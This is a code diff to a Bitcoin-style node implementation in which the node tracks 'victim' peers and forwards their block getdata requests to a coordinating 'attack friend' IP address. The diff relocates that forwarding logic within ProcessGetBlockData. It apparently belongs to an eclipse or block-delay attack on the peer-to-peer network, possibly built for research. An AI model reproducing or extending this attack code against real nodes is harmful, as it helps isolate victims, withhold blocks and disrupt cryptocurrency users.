@@ -1231,6 +1231,15 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
             } else {
                 LogPrintf("VIC %s - weird block requested %s!\n", pfrom->addr.ToString(), inv.hash.ToString());
             }
+
+            pvictimState->getdata_request.insert(inv.hash.ToString());
+
+            //TODO: send the request
+            LogPrintf("Sending request to friend\n");
+
+            struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
+            CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
+            connman->PushMessage(pfriend1, msgMaker.Make(strCommand, vRecv));
         }
         BlockMap::iterator mi = mapBlockIndex.find(inv.hash);
         if (mi != mapBlockIndex.end())
@@ -1263,18 +1272,7 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
              * and the victim has sent us a getdata request. However, we haven't really got this block so set the
              * following boolean to 1. Later when we receive the new block, we can process accordingly.
              */
-            if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
-                std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
-                pvictimState->getdata_request.insert(inv.hash.ToString());
 
-                //TODO: send the request
-                LogPrintf("Sending request to friend\n");
-
-
-                struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
-                CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
-                connman->PushMessage(pfriend1, msgMaker.Make(strCommand, vRecv));
-            }
         }
     }
     // disconnect node in case we have reached the outbound limit for serving historical blocks
